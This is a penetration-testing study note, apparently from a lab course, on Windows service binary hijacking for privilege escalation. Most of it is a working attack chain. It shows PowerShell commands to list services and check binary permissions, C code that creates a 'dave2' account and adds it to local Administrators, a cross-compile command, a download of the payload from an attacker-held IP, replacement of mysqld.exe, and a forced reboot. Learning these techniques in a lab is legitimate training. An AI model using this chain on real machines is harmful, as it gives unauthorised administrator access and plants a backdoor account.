# Service Binary Hijacking

Each Windows service has an associated binary file. These binary
files are executed when the service is started or transitioned into a
running state.

For this section, let's consider a scenario in which a software
developer creates a program and installs an application as a Windows
service. During the installation, the developer does not secure the
permissions of the program, allowing full Read and Write access to
all members of the Users group. As a result, a lower-privileged
user could replace the program with a malicious one. To execute the
replaced binary, the user can restart the service or, in case the
service is configured to start automatically, reboot the machine. Once
the service is restarted, the malicious binary will be executed with
the privileges of the service, such as *LocalSystem*.

**Get information about running binary**

```
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

```

**checking permission of the binaries**

```
PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(RX)
                              NT AUTHORITY\Authenticated Users:(RX)
```

*To exploit a binary we need the permission mentioned below:*

`BUILTIN\Users:(F)`

Let's create a small binary on Kali, which we'll use to replace the
original **mysqld.exe**. The following C code will create a user named
*dave2* and add that user to the local Administrators group using
the *system*[5](https://portal.offsec.com/courses/pen-200-44065/learning/windows-privilege-escalation-45276/leveraging-windows-services-47210/service-binary-hijacking-45284#fn-local_id_1782-5) function. The cross-compiled version of this
code will serve as our malicious binary. Let's save it on Kali in a
file named **adduser.c**.

```
#include <stdlib.h>

int main ()
{
  int i;

  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");

  return 0;
}

```

**Compiling the exploit**

x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

**Transfer exploit to system**

```
PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe

PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

**stop running binary**

```
PS C:\Users\dave> net stop mysql
System error 5 has occurred.

Access is denied.
```

If we do not have necessary permissions, we can check if the service restarts with a reboot.

```
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

Name  StartMode
----  ---------
mysql Auto
```

**Shutdown machine**

shutdown /r /t 0